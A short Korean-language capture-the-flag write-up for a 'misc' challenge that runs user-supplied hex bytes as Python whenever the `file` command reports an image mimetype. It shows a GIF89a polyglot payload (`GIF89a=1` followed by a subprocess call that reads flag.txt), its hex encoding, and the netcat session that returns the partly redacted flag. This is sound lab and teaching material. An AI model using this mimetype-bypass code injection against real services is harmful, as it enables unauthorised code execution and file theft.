# Category

misc

# Overview

Running an image as Python? What a dumb idea...

# Analysis

`dockerfile` 확인 결과 flag파일은 소스코드의 실행 경로인 `/app`에 존재한다.

소스코드를 확인했을 때 사용자가 hex값을 입력하면 file 명령어를 통해 mimetype을 확인하고 `image/`로 시작하면 통과하여 사용자의 입력이 실행됨.

# Exploitation

mimetype image를 통과하기 위해 이미지 파일 시그니쳐값을 입력값 맨 앞에 포함하고 `exec()`에서도 사용가능하게 만들기 위해 gif 파일 시그니쳐인 `474946383961(GIF89a)`을 입력하고 그 뒷 부분에 flag를 조회하는 코드를 입력한다.

아래와 같이 GIF89a부분을 문장완성을 위해 `=1`로 할당하고 서버에 요청한다.

```py
GIF89a=1

# 소스코드에서 subprocess 라이브러리 사용중
subprocess.run(['cat', './flag.txt'])
```

해당 코드를 hex로 바꾸면 `47494638 39613D31 0A737562 70726F63 6573732E 72756E28 5B276361 74272C20 272E2F66 6C61672E 74787427 5D29`와 같은 값을 가지며 서버에 요청하게 되면 flag를 획득할 수 있다.

```sh
$ nc 34.170.146.252 29529
hex bytes> 47494638 39613D31 0A737562 70726F63 6573732E 72756E28 5B276361 74272C20 272E2F66 6C61672E 74787427 5D29
Alpaca{M4...ry}
```

# Flag

`Alpaca{M4...ry}`
